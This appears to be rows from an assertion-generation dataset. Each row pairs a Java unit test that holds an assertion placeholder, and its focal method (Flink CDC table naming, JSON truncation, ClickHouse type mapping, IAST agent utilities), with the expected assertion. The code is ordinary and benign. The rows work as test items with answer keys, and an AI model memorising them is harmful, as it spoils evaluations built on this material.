"testGetSinkTableNameWithConversionLowerCase() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""true""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""TestTable"", ""TestSchema"", null); String expectedTableName = ""testtable""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithConversionUpperCase() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""true""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""TestTable"", ""TestSchema"", null); String expectedTableName = ""TESTTABLE""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithNoConfigPrefixOrSuffix() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.prefix"", """"); sinkConfig.put(""table.suffix"", """"); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""testTable"", ""testSchema"", null); String expectedTableName = ""testTable""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"testGetSinkTableNameWithReplace() { Map<String, String> sinkConfig = new HashMap<>(); sinkConfig.put(""table.replace.pattern"", ""t_(.*?)_""); sinkConfig.put(""table.replace.with"", ""ods_$1_""); sinkConfig.put(""table.lower"", ""false""); sinkConfig.put(""table.upper"", ""false""); when(config.getSink()).thenReturn(sinkConfig);  Table table = new Table(""t_example_test"", ""testSchema"", null); String expectedTableName = ""ods_example_test""; Assert.""<AssertPlaceHolder>""; }
getSinkTableName(Table table) { String tableName = table.getName(); Map<String, String> sink = config.getSink();  // Add table name mapping logic String mappingRoute = sink.get(FlinkCDCConfig.TABLE_MAPPING_ROUTES); if (mappingRoute != null) { Map<String, String> mappingRules = parseMappingRoute(mappingRoute); if (mappingRules.containsKey(tableName)) { tableName = mappingRules.get(tableName); } }  tableName = sink.getOrDefault(FlinkCDCConfig.TABLE_PREFIX, """") + tableName + sink.getOrDefault(FlinkCDCConfig.TABLE_SUFFIX, """"); // table.lower and table.upper can not be true at the same time if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER)) && Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { throw new IllegalArgumentException(""table.lower and table.upper can not be true at the same time""); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_UPPER))) { tableName = tableName.toUpperCase(); }  if (Boolean.parseBoolean(sink.get(FlinkCDCConfig.TABLE_LOWER))) { tableName = tableName.toLowerCase(); } // Implement regular expressions to replace table names through // sink.table.replace.pattern and table.replace.with String replacePattern = sink.get(FlinkCDCConfig.TABLE_REPLACE_PATTERN); String replaceWith = sink.get(FlinkCDCConfig.TABLE_REPLACE_WITH); if (replacePattern != null && replaceWith != null) { Pattern pattern = Pattern.compile(replacePattern); Matcher matcher = pattern.matcher(tableName); tableName = matcher.replaceAll(replaceWith); }  // add schema if (Boolean.parseBoolean(sink.get(""table.prefix.schema""))) { tableName = table.getSchema() + ""_"" + tableName; }  return tableName; }"	assertEquals(expectedTableName, sinkBuilder.getSinkTableName(table))
"toTruncateJsonTest() { SelectResult selectResult = prepareData(); String truncateJson = selectResult.toTruncateJson(10L); log.info(""truncateJson: {}"", truncateJson); ""<AssertPlaceHolder>""; }
toTruncateJson(Long length) { String jsonStr = JSONUtil.toJsonStr(this); long overLength = jsonStr.length() - length; if (overLength <= 0) { return jsonStr; } this.truncationFlag = true; if (CollectionUtil.isEmpty(rowData)) { this.columns = Sets.newLinkedHashSet(); String finalJsonStr = JSONUtil.toJsonStr(this); if (finalJsonStr.length() > length) { log.warn( ""The row data and columns is empty, but still exceeds the length limit. "" + ""Json: {}, length: {}"", finalJsonStr, length); return ""{}""; } return finalJsonStr; } // Estimate the size of each row of data to determine how many rows should be removed. String lineJsonStr = JSONUtil.toJsonStr(rowData.get(rowData.size() - 1)); int lineLength = lineJsonStr.length(); int removeLine = getRemoveLine(overLength, lineLength, rowData.size()); rowData = ListUtil.sub(rowData, 0, rowData.size() - removeLine); return toTruncateJson(length); }"	"assertEquals(""{}"", truncateJson)"
"toTruncateJsonTest2() { SelectResult selectResult = prepareData(); String truncateJson = selectResult.toTruncateJson(200L); log.info(""truncateJson: {}"", truncateJson); selectResult.setRowData(Lists.newArrayList()); ""<AssertPlaceHolder>""; }
toTruncateJson(Long length) { String jsonStr = JSONUtil.toJsonStr(this); long overLength = jsonStr.length() - length; if (overLength <= 0) { return jsonStr; } this.truncationFlag = true; if (CollectionUtil.isEmpty(rowData)) { this.columns = Sets.newLinkedHashSet(); String finalJsonStr = JSONUtil.toJsonStr(this); if (finalJsonStr.length() > length) { log.warn( ""The row data and columns is empty, but still exceeds the length limit. "" + ""Json: {}, length: {}"", finalJsonStr, length); return ""{}""; } return finalJsonStr; } // Estimate the size of each row of data to determine how many rows should be removed. String lineJsonStr = JSONUtil.toJsonStr(rowData.get(rowData.size() - 1)); int lineLength = lineJsonStr.length(); int removeLine = getRemoveLine(overLength, lineLength, rowData.size()); rowData = ListUtil.sub(rowData, 0, rowData.size() - removeLine); return toTruncateJson(length); }"	assertEquals(JSONUtil.toJsonStr(selectResult), truncateJson)
"toTruncateJsonTest3() { SelectResult selectResult = prepareData(); String truncateJson = selectResult.toTruncateJson(250L); log.info(""truncateJson: {}"", truncateJson); selectResult.setRowData(Lists.newArrayList(selectResult.getRowData().get(0))); ""<AssertPlaceHolder>""; }
toTruncateJson(Long length) { String jsonStr = JSONUtil.toJsonStr(this); long overLength = jsonStr.length() - length; if (overLength <= 0) { return jsonStr; } this.truncationFlag = true; if (CollectionUtil.isEmpty(rowData)) { this.columns = Sets.newLinkedHashSet(); String finalJsonStr = JSONUtil.toJsonStr(this); if (finalJsonStr.length() > length) { log.warn( ""The row data and columns is empty, but still exceeds the length limit. "" + ""Json: {}, length: {}"", finalJsonStr, length); return ""{}""; } return finalJsonStr; } // Estimate the size of each row of data to determine how many rows should be removed. String lineJsonStr = JSONUtil.toJsonStr(rowData.get(rowData.size() - 1)); int lineLength = lineJsonStr.length(); int removeLine = getRemoveLine(overLength, lineLength, rowData.size()); rowData = ListUtil.sub(rowData, 0, rowData.size() - removeLine); return toTruncateJson(length); }"	assertEquals(JSONUtil.toJsonStr(selectResult), truncateJson)
"replaceFragmentTest() { String statement = ""nullif1:=NULLIF(1, 0) as val;\n"" + ""nullif2:=NULLIF(0, 0) as val$null;\n"" + ""select ${nullif1},${nullif2}""; String pretreatStatement = FlinkInterceptor.pretreatStatement(ExecutorFactory.getDefaultExecutor(), statement); Assert.""<AssertPlaceHolder>""; }
pretreatStatement(Executor executor, String statement) { statement = SqlUtil.removeNote(statement); if (executor.isUseSqlFragment()) { statement = executor.getVariableManager().parseVariable(statement); } return statement.trim(); }"	"assertEquals(""select NULLIF(1, 0) as val,NULLIF(0, 0) as val$null"", pretreatStatement)"
"ofTest() { String dataType = ""Decimal(6)""; ClickHouseDataTypeEnum res = of(dataType); ""<AssertPlaceHolder>""; }
of(String dataType) { if (Objects.isNull(dataType)) { return ClickHouseDataTypeEnum.String; } ClickHouseDataTypeEnum ckDataTypeEnum = CK_DATA_TYPE_MAP.get(dataType); if (Objects.nonNull(ckDataTypeEnum)) { return ckDataTypeEnum; } ClickHouseDataTypeEnum clickHouseDataTypeEnum = Optional.ofNullable(match(dataType)).orElse(Lists.newArrayList()).stream() .max(Comparator.comparing(ClickHouseDataTypeEnum::getMatchPriority)) .orElse(ClickHouseDataTypeEnum.String); CK_DATA_TYPE_MAP.put(dataType, clickHouseDataTypeEnum); return clickHouseDataTypeEnum; }"	assertEquals(Decimal, res)
"ofTest2() { String dataType = ""Decimal32(6)""; ClickHouseDataTypeEnum res = of(dataType); ""<AssertPlaceHolder>""; }
of(String dataType) { if (Objects.isNull(dataType)) { return ClickHouseDataTypeEnum.String; } ClickHouseDataTypeEnum ckDataTypeEnum = CK_DATA_TYPE_MAP.get(dataType); if (Objects.nonNull(ckDataTypeEnum)) { return ckDataTypeEnum; } ClickHouseDataTypeEnum clickHouseDataTypeEnum = Optional.ofNullable(match(dataType)).orElse(Lists.newArrayList()).stream() .max(Comparator.comparing(ClickHouseDataTypeEnum::getMatchPriority)) .orElse(ClickHouseDataTypeEnum.String); CK_DATA_TYPE_MAP.put(dataType, clickHouseDataTypeEnum); return clickHouseDataTypeEnum; }"	assertEquals(Decimal32, res)
"ofTest4() { String dataType = ""UInt32""; ClickHouseDataTypeEnum res = of(dataType); ""<AssertPlaceHolder>""; }
of(String dataType) { if (Objects.isNull(dataType)) { return ClickHouseDataTypeEnum.String; } ClickHouseDataTypeEnum ckDataTypeEnum = CK_DATA_TYPE_MAP.get(dataType); if (Objects.nonNull(ckDataTypeEnum)) { return ckDataTypeEnum; } ClickHouseDataTypeEnum clickHouseDataTypeEnum = Optional.ofNullable(match(dataType)).orElse(Lists.newArrayList()).stream() .max(Comparator.comparing(ClickHouseDataTypeEnum::getMatchPriority)) .orElse(ClickHouseDataTypeEnum.String); CK_DATA_TYPE_MAP.put(dataType, clickHouseDataTypeEnum); return clickHouseDataTypeEnum; }"	assertEquals(UInt32, res)
"extractPIDTest() { //初始化临时文件 IastProperties.initTmpDir(); //获取PID String runtimeName = ManagementFactory.getRuntimeMXBean().getName();  //Java获取的runtimeName格式为 PID@虚拟机唯一标识 提取PID String pid = EngineManager.extractPID(runtimeName); Assert.""<AssertPlaceHolder>""; }
extractPID(String runtimeName){ Pattern pattern = Pattern.compile(""^\\d+""); Matcher matcher = pattern.matcher(runtimeName);  //防止极端情况未获取到PID ，设置默认值为0，防止服务端出现问题 String extractedNumber = ""0""; if (matcher.find()) { extractedNumber  = matcher.group(); // 提取匹配到的数字 }else { DongTaiLog.warn(""Get PID parsing exception, PID raw data is {}"",runtimeName); } return extractedNumber; }"	"assertTrue(pid.matches(""\\d+""))"
"testConvert() { // 创建一个 OpenApiSchemaConvertorManager，这里可以根据需要进行配置 OpenApiSchemaConvertorManager manager = new OpenApiSchemaConvertorManager();  // 创建一个 ServiceConvertor 实例，传入需要转换的接口类 Class<?> interfaceClass = TestDubboServiceInterface.class; // 替换成实际的接口类 ServiceConvertor serviceConvertor = new ServiceConvertor(manager, interfaceClass);  // 调用 convert 方法进行转换 Map<String, Path> pathMap = serviceConvertor.convert();  // 打印转换结果或进行其他断言 for (Map.Entry<String, Path> entry : pathMap.entrySet()) { String path = entry.getKey(); Path pathData = entry.getValue(); // 进行其他断言或操作 Method method = AnalysisMethod(path); List<Parameter> parameters = pathData.getDubbo().getParameters(); Class<?>[] parameterTypes = method.getParameterTypes(); for (int i = 0, parametersSize = parameters.size(); i < parametersSize; i++) { Parameter parameter = parameters.get(i); String type = parameter.getSchema().getType(); Class<?> parameterType = parameterTypes[i]; String s = interceptType(parameterType); Assert.""<AssertPlaceHolder>""; }  } }
convert() { Map<String, Path> pathMap = new HashMap<>(); for (Method parseServiceMethod : this.parseServiceMethods()) { try { Operation convert = new MethodConvertor(this.manager, parseServiceMethod).convert(); Path path = new Path(); path.setDubbo(convert); pathMap.put(this.buildSign(parseServiceMethod), path); } catch (Throwable e) { DongTaiLog.debug(""ServiceConvertor.convert exception"", e); } } return pathMap; }"	assertTrue(s.equalsIgnoreCase(type))
"formatClassNameToDotDelimiter() { String s = StringUtils.formatClassNameToDotDelimiter(""com/foo/bar""); Assert.""<AssertPlaceHolder>""; }
formatClassNameToDotDelimiter(String className) { return replaceChar(className, '/', '.'); }"	"assertEquals(""com.foo.bar"", s)"
"formatClassNameToSlashDelimiter() { String s = StringUtils.formatClassNameToSlashDelimiter(""com.foo.bar""); Assert.""<AssertPlaceHolder>""; }
formatClassNameToSlashDelimiter(String className) { return replaceChar(className, '.', '/'); }"	"assertEquals(""com/foo/bar"", s)"
"getPrintStackTraceString() { Exception e = new Exception(); String printStackTraceString = ExceptionUtil.getPrintStackTraceString(e); Assert.""<AssertPlaceHolder>""; }
getPrintStackTraceString(Throwable e) { StringWriter stringWriter = new StringWriter(); PrintWriter printWriter = new PrintWriter(stringWriter); e.printStackTrace(printWriter); return stringWriter.toString(); }"	assertNotNull(printStackTraceString)
"getInstance() { IastClassDiagram instance = IastClassDiagram.getInstance(); Assert.""<AssertPlaceHolder>""; }
getInstance() { // DCL if (instance == null) { synchronized (IastClassDiagram.class) { if (instance == null) { instance = new IastClassDiagram(); } } } return instance; }"	assertNotNull(instance)
